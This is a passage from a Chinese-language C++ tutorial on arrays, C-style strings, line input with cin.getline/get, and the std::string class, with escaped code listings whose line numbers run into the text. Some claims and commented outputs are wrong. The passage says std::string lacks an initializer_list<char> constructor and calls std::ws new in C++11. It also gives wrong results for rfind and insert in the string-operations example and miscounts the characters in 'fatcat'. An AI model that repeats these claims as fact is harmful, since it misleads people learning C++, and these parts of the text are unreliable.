main() &#123; // 完整初始化 int fibonacci[8] = &#123;0, 1, 1, 2, 3, 5, 8, 13&#125;; std::cout &lt;&lt; &quot;Fibonacci[5]: &quot; &lt;&lt; fibonacci[5] &lt;&lt; std::endl; // 输出 8 // 部分初始化 double data[5] = &#123;1.1, 2.2&#125;; std::cout &lt;&lt; &quot;Data[0]: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 输出 1.1 std::cout &lt;&lt; &quot;Data[1]: &quot; &lt;&lt; data[1] &lt;&lt; std::endl; // 输出 2.2 std::cout &lt;&lt; &quot;Data[2]: &quot; &lt;&lt; data[2] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Data[3]: &quot; &lt;&lt; data[3] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Data[4]: &quot; &lt;&lt; data[4] &lt;&lt; std::endl; // 输出 0 // 省略大小 char vowels[] = &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; std::cout &lt;&lt; &quot;Number of vowels: &quot; &lt;&lt; sizeof(vowels) / sizeof(char) &lt;&lt; std::endl; // 输出 5 // 初始化所有元素为 0 int results[20] = &#123;0&#125;; std::cout &lt;&lt; &quot;Results[15]: &quot; &lt;&lt; results[15] &lt;&lt; std::endl; // 输出 0 return 0;&#125; 4.1.3 C++11数组初始化方法C++11 引入了更统一的初始化语法，称为列表初始化 (List Initialization) 或**花括号初始化 (Brace Initialization)**，它也可以用于数组。 主要变化: 可以省略等号 =: 在使用初始化列表时，可以省略声明语句中的等号。 禁止缩窄转换 (Narrowing Conversion): 列表初始化不允许可能导致数据丢失的“缩窄”转换。例如，不能将浮点数直接初始化给整型数组元素，也不能将超出范围的整数值初始化给较小范围的整型数组元素。 语法: 12typeName arrayName[arraySize] &#123;initializer_list&#125;; // C++11 列表初始化 (可省略等号)typeName arrayName[] &#123;initializer_list&#125;; // 省略大小 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // C++11 列表初始化 (省略等号) int scores[5] &#123;90, 85, 92, 78, 88&#125;; double lengths[3] &#123;1.2, 3.4, 0.5&#125;; int counts[10] &#123;1, 2, 3&#125;; // 部分初始化，剩余元素为 0 int allZeros[100] &#123;&#125;; // 所有元素初始化为 0 (空列表) short values[] &#123;10, 20, 30, 40&#125;; // 省略大小 std::cout &lt;&lt; &quot;Scores[1]: &quot; &lt;&lt; scores[1] &lt;&lt; std::endl; // 输出 85 std::cout &lt;&lt; &quot;Counts[5]: &quot; &lt;&lt; counts[5] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;allZeros[50]: &quot; &lt;&lt; allZeros[50] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Size of values: &quot; &lt;&lt; sizeof(values) / sizeof(short) &lt;&lt; std::endl; // 输出 4 // 禁止缩窄转换示例 // int errors[3] &#123;1, 2, 3.0&#125;; // 错误! double (3.0) 到 int 是缩窄转换 // char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // 错误! 300 超出 char 的范围 (假设 char 是 8 位) // 允许非缩窄转换 char chars_ok[3] &#123; &#x27;a&#x27;, 66, &#x27;c&#x27; &#125;; // 66 在 char 范围内，可以隐式转换为 &#x27;B&#x27; std::cout &lt;&lt; &quot;Chars OK: &quot; &lt;&lt; chars_ok[0] &lt;&lt; chars_ok[1] &lt;&lt; chars_ok[2] &lt;&lt; std::endl; // 输出 aBc return 0;&#125; 建议: C++11 的列表初始化提供了更一致、更安全的初始化方式，推荐在支持 C++11 及更高标准的项目中使用。特别是 typeName arrayName[size] &#123;&#125;; 这种将所有元素初始化为零值的形式非常方便。 4.2 字符串字符串是程序中用于表示文本信息的重要数据类型。C++处理字符串有两种主要方式： C风格字符串 (C-Style String): 这是继承自C语言的方式，将字符串视为存储在 char 数组中并以空字符 (\\0) 结尾的字符序列。 string 类: C++标准库提供了一个强大的 string 类，提供了更方便、更安全的字符串操作（将在 4.3 节介绍）。 本节主要关注 C 风格字符串。 字符串字面值 (String Literal) 或字符串常量 (String Constant):在代码中用双引号 &quot;&quot; 括起来的字符序列，例如 &quot;Hello, world!&quot;, &quot;C++&quot;, &quot;&quot; (空字符串)。它们存储在内存的只读区域。编译器会自动在字符串字面值的末尾添加空字符 \\0。 4.2.1 拼接字符串常量C++允许将相邻的字符串字面值自动拼接（连接）成一个单独的字符串。这对于将较长的字符串分成多行书写非常有用，可以提高代码的可读性。 用法与示例: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;int main() &#123; // 相邻的字符串字面值会被自动拼接 std::cout &lt;&lt; &quot;This is the first part, &quot; &quot;and this is the second part.&quot; &lt;&lt; std::endl; // 输出: This is the first part, and this is the second part. // 可以跨越多行 std::cout &lt;&lt; &quot;Line 1: Some text...\\n&quot; &quot;Line 2: More text...\\n&quot; &quot;Line 3: Final line.&quot; &lt;&lt; std::endl; /* 输出: Line 1: Some text... Line 2: More text... Line 3: Final line. */ // 拼接结果是一个单独的字符串常量 const char* long_message = &quot;Part 1. &quot; &quot;Part 2. &quot; &quot;Part 3.&quot;; std::cout &lt;&lt; long_message &lt;&lt; std::endl; // 输出: Part 1. Part 2. Part 3. // 注意：变量和字符串字面值不能自动拼接 std::string part1 = &quot;Hello&quot;; // std::cout &lt;&lt; part1 &quot; world!&quot;; // 错误! 不能这样拼接变量和字面值 // 需要使用 string 类的拼接操作 (见 4.3 节) 或 cout 的链式输出 std::cout &lt;&lt; part1 &lt;&lt; &quot; world!&quot; &lt;&lt; std::endl; // 正确 return 0;&#125; 4.2.2 在数组中使用字符串C风格字符串本质上是 char 类型的数组，其特殊之处在于最后一个字符必须是**空字符 (\\0)**。这个空字符标记了字符串的实际结束位置。 声明和初始化: 可以使用字符串字面值来初始化 char 数组。编译器会自动计算大小（包括末尾的 \\0）并将其复制到数组中。 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;cstring&gt; // 包含 C 风格字符串函数库 (例如 strlen)int main() &#123; // 使用字符串字面值初始化 char 数组 char dog[8] = &quot;fatcat&quot;; // 数组大小必须足够容纳字符串 + 空字符 (&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27;) // dog 数组大小为 8，实际使用 7 个字符 + 1 个空字符 char bird[] = &quot;wren&quot;; // 编译器自动推断大小为 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\\0&#x27;) // 使用列表初始化 (需要显式包含空字符) char fish[] = &#123;&#x27;t&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;t&#x27;, &#x27;\\0&#x27;&#125;; // 错误示例：数组大小不足 // char cat[3] = &quot;cat&quot;; // 错误! 需要大小 4 来存储 &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; std::cout &lt;&lt; &quot;Dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // cout 遇到空字符停止输出 std::cout &lt;&lt; &quot;Bird: &quot; &lt;&lt; bird &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fish: &quot; &lt;&lt; fish &lt;&lt; std::endl; // 访问单个字符 std::cout &lt;&lt; &quot;Third letter of dog: &quot; &lt;&lt; dog[2] &lt;&lt; std::endl; // 输出 &#x27;t&#x27; dog[0] = &#x27;p&#x27;; // 可以修改数组内容 std::cout &lt;&lt; &quot;Modified dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // 输出 &quot;patcat&quot; // strlen() 函数计算字符串长度 (不包括空字符) std::cout &lt;&lt; &quot;Length of dog: &quot; &lt;&lt; std::strlen(dog) &lt;&lt; std::endl; // 输出 6 (因为现在是 &quot;patcat&quot;) std::cout &lt;&lt; &quot;Length of bird: &quot; &lt;&lt; std::strlen(bird) &lt;&lt; std::endl; // 输出 4 // sizeof() 计算整个数组占用的内存大小 (包括空字符和未使用的空间) std::cout &lt;&lt; &quot;Size of dog array: &quot; &lt;&lt; sizeof(dog) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出 8 std::cout &lt;&lt; &quot;Size of bird array: &quot; &lt;&lt; sizeof(bird) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出 5 return 0;&#125; 关键点: 存储 C 风格字符串的 char 数组大小必须至少是字符串长度加 1（为 \\0 留出空间）。 字符串字面值初始化会自动添加 \\0。 列表初始化需要手动添加 \\0。 strlen() 计算的是到 \\0 为止的字符数。 sizeof() 计算的是整个数组的字节大小。 4.2.3 字符串输入使用 cin 和 &gt;&gt; 运算符读取 C 风格字符串（存储在 char 数组中）时，存在一个主要限制：cin 默认以空白字符（空格、制表符、换行符）作为输入的分隔符。这意味着 cin &gt;&gt; 只会读取到第一个空白字符之前的部分。 用法与示例: 123456789101112131415161718#include &lt;iostream&gt;int main() &#123; const int SIZE = 20; char name[SIZE]; char dessert[SIZE]; std::cout &lt;&lt; &quot;Enter your first name: &quot;; std::cin &gt;&gt; name; // 读取直到遇到第一个空白字符 std::cout &lt;&lt; &quot;Enter your favorite dessert: &quot;; std::cin &gt;&gt; dessert; // 读取直到遇到第一个空白字符 std::cout &lt;&lt; &quot;Hello, &quot; &lt;&lt; name &lt;&lt; &quot;!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;I see you like &quot; &lt;&lt; dessert &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; return 0;&#125; 运行示例及问题: 如果用户输入： 12Enter your first name: Ada LovelaceEnter your favorite dessert: Chocolate Cake 程序输出将会是： 12Hello, Ada!I see you like Lovelace. 原因: cin &gt;&gt; name; 读取到 “Ada” 后遇到空格停止，”Ada” 被存入 name 数组（并自动添加 \\0）。 “ Lovelace\\nChocolate Cake\\n” 仍然留在输入缓冲区中。 cin &gt;&gt; dessert; 从缓冲区开始读取，跳过开头的空格，读取到 “Lovelace” 后遇到换行符停止，”Lovelace” 被存入 dessert 数组。 这显然不是我们期望的结果。cin &gt;&gt; 不适合读取包含空格的字符串。此外，如果用户输入的单词长度超过了数组的大小（减去 \\0 的空间），还会导致**缓冲区溢出 (Buffer Overflow)**，这是严重的安全隐患。 4.2.4 每次读取一行字符串输入为了解决 cin &gt;&gt; 的问题，iostream 库提供了其他成员函数来读取整行输入，包括其中的空格，直到遇到换行符为止。常用的有两个：getline() 和 get()。 1. cin.getline(char* buffer, int size, char delimiter = &#39;\\n&#39;) buffer: 用于存储输入的 char 数组。 size: 缓冲区的大小。getline() 最多读取 size - 1 个字符，以确保有空间存放末尾的空字符 \\0。 delimiter (可选): 指定读取停止的分隔符，默认为换行符 \\n。 行为: 读取字符到 buffer 中，直到读取了 size - 1 个字符、遇到 delimiter 或到达文件末尾。 如果遇到 delimiter，它会读取并丢弃该分隔符（通常是换行符）。 总是在读取的字符序列末尾添加空字符 \\0。 2. cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;) 参数与 getline() 类似。 行为: 读取字符到 buffer 中，直到读取了 size - 1 个字符、遇到 delimiter 或到达文件末尾。 与 getline() 不同的是，如果遇到 delimiter，它不会读取该分隔符，而是将其留在输入缓冲区中。 总是在读取的字符序列末尾添加空字符 \\0。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; const int SIZE = 50; char fullName[SIZE]; char address[SIZE]; // 使用 getline() std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(fullName, SIZE); // 读取整行，包括空格，丢弃换行符 std::cout &lt;&lt; &quot;Enter your address: &quot;; std::cin.getline(address, SIZE); // 读取下一行 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; fullName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address: &quot; &lt;&lt; address &lt;&lt; std::endl; std::cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // 使用 get() - 注意换行符问题 char title[SIZE]; char author[SIZE]; std::cout &lt;&lt; &quot;Enter book title: &quot;; std::cin.get(title, SIZE); // 读取整行，换行符留在缓冲区 // 如果直接调用下一个 get()，它会立即读到上一个留下的换行符并停止 // std::cin.get(author, SIZE); // 这将导致 author 为空 // 需要处理掉留下的换行符 // 方法一：再调用一次 get() 读取单个字符 // std::cin.get(); // 读取并丢弃换行符 // 方法二：使用 ignore() 跳过字符 std::cin.ignore(100, &#x27;\\n&#x27;); // 跳过最多100个字符，直到遇到换行符（并丢弃换行符） std::cout &lt;&lt; &quot;Enter author name: &quot;; std::cin.get(author, SIZE); // 现在可以正确读取作者名 std::cout &lt;&lt; &quot;Title: &quot; &lt;&lt; title &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Author: &quot; &lt;&lt; author &lt;&lt; std::endl; return 0;&#125; 选择 getline() 还是 get()? getline() 通常更方便，因为它会自动处理掉行尾的换行符，使得连续读取多行输入更简单。 get() 提供了更精细的控制，因为它允许你检查下一个字符是否是换行符，但需要你手动处理留在缓冲区的分隔符。 空行和 getline(): 如果 getline() 遇到空行（即用户直接按 Enter），它会读取这个空行，将一个空字符串（只包含 \\0）存入缓冲区，并丢弃换行符。 4.2.5 混合输入字符串和数字当程序需要交替读取数字（使用 cin &gt;&gt;）和整行字符串（使用 cin.getline() 或 cin.get()）时，经常会遇到一个问题：cin &gt;&gt; 读取数字后，会将数字后面的换行符留在输入缓冲区中。 如果紧接着调用 cin.getline() 或 cin.get()，它们会立即读到这个残留的换行符，并认为已经到达行尾，导致读取失败或读到空字符串。 问题示例: 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // 读取年龄，换行符留在缓冲区 std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // 立即读到残留的换行符，getline 结束，name 为空 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; // 输出 Name: [] return 0;&#125; 解决方法: 在读取数字后、调用 getline() 或 get() 读取整行之前，需要消耗掉输入缓冲区中残留的换行符。 使用 cin.ignore(): 这是常用的方法。cin.ignore(n, delim) 会跳过输入流中的字符，直到跳过了 n 个字符，或者遇到了 delim 分隔符（并丢弃该分隔符），以先到者为准。通常用于丢弃换行符： 123std::cin.ignore(100, &#x27;\\n&#x27;); // 跳过最多100个字符，直到并包括下一个换行符// 或者更简单地，如果确定只有一个换行符需要丢弃// std::cin.ignore(); // 跳过下一个字符 (即换行符) 使用 (cin &gt;&gt; ws): C++11 引入了 std::ws 输入流操纵符，它可以读取并丢弃输入流开头的所有空白字符（包括换行符）。 1(std::cin &gt;&gt; std::ws).getline(name, 50); 使用 cin.get() 读取单个字符: 1std::cin.get(); // 读取并丢弃换行符 修正后的示例 (使用 cin.ignore()): 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;limits&gt; // 为了 numeric_limits (更健壮的 ignore)int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // 清除输入缓冲区，特别是换行符 std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); // numeric_limits&lt;streamsize&gt;::max() 获取流能处理的最大字符数，确保清除整行 std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // 现在可以正确读取姓名 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; 修正后的示例 (使用 ws): 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;ios&gt; // 为了 wsint main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Enter your full name: &quot;; // 在 getline 之前使用 ws 跳过空白符 (std::cin &gt;&gt; std::ws).getline(name, 50); std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; 总结: 混合输入数字和整行字符串时，务必记得在 cin &gt;&gt; number; 之后、调用 getline() 或 get() 之前，清除输入缓冲区中残留的换行符。使用 cin.ignore() 或 (cin &gt;&gt; ws) 是推荐的做法。 4.3 string类简介虽然 C 风格字符串（字符数组）在 C++ 中仍然可用，但 C++ 标准库提供了一个更强大、更方便、更安全的替代品：std::string 类。 string 类是标准库的一部分，它封装了字符序列的操作，提供了自动内存管理和丰富的成员函数来处理字符串。要使用 string 类，需要包含 &lt;string&gt; 头文件。 基本概念: 对象: string 类型的变量是**对象 (Object)**。对象是类的实例。 自动内存管理: 与需要手动管理内存（确保数组足够大，处理空字符）的 C 风格字符串不同，string 对象会自动处理内存分配和释放。它可以根据需要动态增长或缩小。 成员函数: string 类提供了许多内置的操作（成员函数），如获取长度、拼接、查找、替换等，使得字符串处理更加容易。 基本用法: 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt; // 必须包含 string 头文件int main() &#123; // 声明 string 对象 std::string s1; // 创建一个空字符串 std::string s2 = &quot;Hello&quot;; // 使用 C 风格字符串字面值初始化 std::string s3(&quot;World&quot;); // 使用 C 风格字符串字面值初始化 (构造函数语法) std::string s4 = s2; // 使用另一个 string 对象初始化 (复制) std::cout &lt;&lt; &quot;s1: &quot; &lt;&lt; s1 &lt;&lt; std::endl; // 输出空行 std::cout &lt;&lt; &quot;s2: &quot; &lt;&lt; s2 &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;s3: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // 输出 World std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; // 输出 Hello // string 对象可以像普通变量一样使用 std::string message = s2 + &quot;, &quot; + s3 + &quot;!&quot;; // 字符串拼接 std::cout &lt;&lt; &quot;Message: &quot; &lt;&lt; message &lt;&lt; std::endl; // 输出 Hello, World! return 0;&#125; 4.3.1 C++11字符串初始化C++11 引入的列表初始化（花括号初始化）也可以用于 string 对象，其行为类似于使用 C 风格字符串字面值进行初始化。 语法: 123456#include &lt;string&gt;std::string str1 &#123; &quot;Initialized with braces&quot; &#125;; // 使用 C 风格字符串字面值std::string str2 = &#123; &quot;Also works with =&quot; &#125;; // std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 中通常不直接用字符列表初始化 string (会尝试调用匹配的构造函数)// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // 同上 注意: 直接使用字符列表 &#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125; 来初始化 std::string 在 C++11/14 中通常不会按预期工作，因为它会尝试查找接受 std::initializer_list&lt;char&gt; 的构造函数，而标准 std::string 没有这样的构造函数。它通常会被解释为尝试调用接受 C 风格字符串 ( const char* ) 的构造函数，但这需要列表恰好能形成一个有效的 C 风格字符串（例如，包含 \\0）。 最常用和清晰的初始化方式仍然是使用字符串字面值或另一个 string 对象。 用法与示例: 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string greeting1 &#123; &quot;Good morning&quot; &#125;; std::string greeting2 = &#123; &quot;Good afternoon&quot; &#125;; // std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\\0&#x27; &#125;; // 可能不按预期工作或编译错误 std::cout &lt;&lt; greeting1 &lt;&lt; std::endl; // 输出 Good morning std::cout &lt;&lt; greeting2 &lt;&lt; std::endl; // 输出 Good afternoon // 推荐的初始化方式 std::string s1 = &quot;Hello&quot;; // C 风格字面值 std::string s2(&quot;World&quot;); // 构造函数语法 std::string s3 = s1; // 复制构造 std::string s4(10, &#x27;c&#x27;); // 创建包含 10 个 &#x27;c&#x27; 的字符串 &quot;cccccccccc&quot; std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; return 0;&#125; 4.3.2 赋值、拼接和附加string 类重载了常见的运算符，使得赋值、拼接和附加操作非常直观。 赋值 (=): 可以将一个 string 对象、一个 C 风格字符串字面值或一个 char 赋给一个 string 对象。 拼接 (+): 可以使用 + 运算符将两个 string 对象、string 对象和 C 风格字符串字面值、或者 string 对象和 char 拼接起来，生成一个新的 string 对象。注意：不能直接拼接两个 C 风格字符串字面值，至少有一个操作数需要是 string 对象。 附加 (+=): 可以使用 += 运算符将一个 string 对象、一个 C 风格字符串字面值或一个 char 附加到现有 string 对象的末尾（修改原字符串）。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;Hello&quot;; std::string s2 = &quot;World&quot;; std::string s3; std::string s4; // 赋值 s3 = s1; // s3 变为 &quot;Hello&quot; std::cout &lt;&lt; &quot;s3 after assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &quot;Goodbye&quot;; // s3 变为 &quot;Goodbye&quot; std::cout &lt;&lt; &quot;s3 after new assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &#x27;X&#x27;; // s3 变为 &quot;X&quot; std::cout &lt;&lt; &quot;s3 after char assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // 拼接 (+) - 创建新字符串 s4 = s1 + &quot; &quot; + s2 + &quot;!&quot;; // s4 变为 &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s4 (concatenated): &quot; &lt;&lt; s4 &lt;&lt; std::endl; std::string s5 = s1 + &#x27;!&#x27;; // s5 变为 &quot;Hello!&quot; std::cout &lt;&lt; &quot;s5 (string + char): &quot; &lt;&lt; s5 &lt;&lt; std::endl; // 错误: 不能直接拼接两个 C 风格字符串字面值 // std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // 编译错误! // 正确: 至少有一个是 string 对象 std::string ok_str1 = s1 + &quot; String2&quot;; std::string ok_str2 = &quot;String1&quot; + s2; std::cout &lt;&lt; &quot;ok_str1: &quot; &lt;&lt; ok_str1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;ok_str2: &quot; &lt;&lt; ok_str2 &lt;&lt; std::endl; // 附加 (+=) - 修改原字符串 s1 += &quot; &quot;; // s1 变为 &quot;Hello &quot; s1 += s2; // s1 变为 &quot;Hello World&quot; s1 += &#x27;!&#x27;; // s1 变为 &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s1 after append: &quot; &lt;&lt; s1 &lt;&lt; std::endl; return 0;&#125; 4.3.3 string类的其他操作string 类提供了大量成员函数来执行各种字符串操作。以下是一些常用的操作： 获取长度/大小: size() 或 length(): 返回字符串中的字符数（两者功能相同）。 检查是否为空: empty(): 如果字符串为空，返回 true，否则返回 false。 访问字符: [] 运算符: 像数组一样通过索引访问字符（不进行边界检查）。 at(): 通过索引访问字符（进行边界检查，如果越界会抛出 std::out_of_range 异常）。 查找: find(): 查找子字符串或字符首次出现的位置，返回索引；如果未找到，返回 std::string::npos (一个特殊的静态成员常量)。 rfind(): 从后向前查找。 find_first_of(), find_last_of(), find_first_not_of(), find_last_not_of(): 查找字符集中的任意字符或非任意字符。 子字符串: substr(pos, count): 返回从位置 pos 开始，长度为 count 的子字符串。 比较: compare(): 比较字符串（字典序），返回负数、零或正数。 重载的关系运算符 (==, !=, &lt;, &gt;, &lt;=, &gt;=): 可以直接比较 string 对象。 修改: insert(): 在指定位置插入字符或字符串。 erase(): 删除指定位置和数量的字符。 replace(): 替换指定范围的字符。 clear(): 清空字符串。 append(): 等同于 +=。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;stdexcept&gt; // 为了 std::out_of_rangeint main() &#123; std::string text = &quot;Hello C++ World!&quot;; // 长度和空检查 std::cout &lt;&lt; &quot;Text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; text.length() &lt;&lt; std::endl; // 输出 16 std::cout &lt;&lt; &quot;Is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // 输出 false // 访问字符 std::cout &lt;&lt; &quot;First char (operator[]): &quot; &lt;&lt; text[0] &lt;&lt; std::endl; // 输出 H std::cout &lt;&lt; &quot;Fifth char (at()): &quot; &lt;&lt; text.at(4) &lt;&lt; std::endl; // 输出 o // std::cout &lt;&lt; text.at(20); // 会抛出 std::out_of_range 异常 // 查找 size_t pos_cpp = text.find(&quot;C++&quot;); if (pos_cpp != std::string::npos) &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; found at index: &quot; &lt;&lt; pos_cpp &lt;&lt; std::endl; // 输出 6 &#125; else &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; not found.&quot; &lt;&lt; std::endl; &#125; size_t pos_l = text.find(&#x27;l&#x27;); // 查找第一个 &#x27;l&#x27; std::cout &lt;&lt; &quot;First &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_l &lt;&lt; std::endl; // 输出 2 size_t pos_last_l = text.rfind(&#x27;l&#x27;); // 查找最后一个 &#x27;l&#x27; std::cout &lt;&lt; &quot;Last &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_last_l &lt;&lt; std::endl; // 输出 12 // 子字符串 std::string sub = text.substr(6, 3); // 从索引 6 开始，取 3 个字符 std::cout &lt;&lt; &quot;Substring (6, 3): \\&quot;&quot; &lt;&lt; sub &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;C++&quot; // 比较 std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; s1 &lt;&lt; &quot;\\&quot; comes before \\&quot;&quot; &lt;&lt; s2 &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; &#125; int cmp_result = s1.compare(s2); // 返回负数，因为 &quot;apple&quot; &lt; &quot;apply&quot; std::cout &lt;&lt; &quot;Compare result: &quot; &lt;&lt; cmp_result &lt;&lt; std::endl; // 修改 text.insert(10, &quot; beautiful&quot;); // 在索引 10 处插入 std::cout &lt;&lt; &quot;After insert: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello C++ beautiful World!&quot; text.erase(6, 4); // 从索引 6 开始，删除 4 个字符 (&quot;C++ &quot;) std::cout &lt;&lt; &quot;After erase: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello beautiful World!&quot; text.replace(6, 9, &quot;gorgeous&quot;); // 从索引 6 开始，替换 9 个字符 (&quot;beautiful&quot;) std::cout &lt;&lt; &quot;After replace: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello gorgeous World!&quot; text.clear(); // 清空字符串 std::cout &lt;&lt; &quot;After clear, is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // 输出 true return 0;&#125; 4.3.4 string类I/O可以使用标准的输入输出流对象 cin 和 cout 来方便地读写 string 对象。 输出 (cout &lt;&lt;): &lt;&lt; 运算符被重载，可以直接将 string 对象输出到 cout。 输入 (cin &gt;&gt;): &gt;&gt; 运算符被重载，可以从 cin 读取一个单词（以空白符——空格、制表符、换行符分隔）到 string 对象中。它会自动跳过开头的空白符，然后在遇到下一个空白符时停止读取。 读取整行 (getline()): 如果需要读取包含空格的整行文本，应该使用 getline() 函数（这是一个全局函数，不是 string 的成员函数）。 getline(cin, str): 从 cin 读取一行（直到遇到换行符 \\n），并将内容（不包括换行符）存储到 string 对象 str 中。 getline(cin, str, delimiter): 读取直到遇到指定的 delimiter 字符为止。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word1, word2; std::string line; // 输出 std::string message = &quot;Enter two words:&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; // 输入 (cin &gt;&gt; 读取单词) std::cin &gt;&gt; word1 &gt;&gt; word2; // 输入 &quot;Hello World&quot; (用空格隔开) std::cout &lt;&lt; &quot;Word 1: &quot; &lt;&lt; word1 &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;Word 2: &quot; &lt;&lt; word2 &lt;&lt; std::endl; // 输出 World // 清除输入缓冲区中可能残留的换行符 (cin &gt;&gt; 之后通常需要) std::cin.ignore(10000, &#x27;\\n&#x27;); // 输入 (getline 读取整行) std::cout &lt;&lt; &quot;Enter a line of text: &quot;; getline(std::cin, line); // 输入 &quot;This is a test line.&quot; std::cout &lt;&lt; &quot;You entered: \\&quot;&quot; &lt;&lt; line &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;This is a test line.&quot; return 0;&#125; 注意: 在混合使用 cin &gt;&gt; 和 getline(cin, ...) 时要特别小心。cin &gt;&gt; 读取单词后，会将换行符留在输入缓冲区中。如果紧接着调用 getline()，它会立即读到这个换行符并认为读取结束，导致得到一个空字符串。通常需要在 cin &gt;&gt; 之后、getline() 之前清除缓冲区中的换行符，例如使用 std::cin.ignore()。 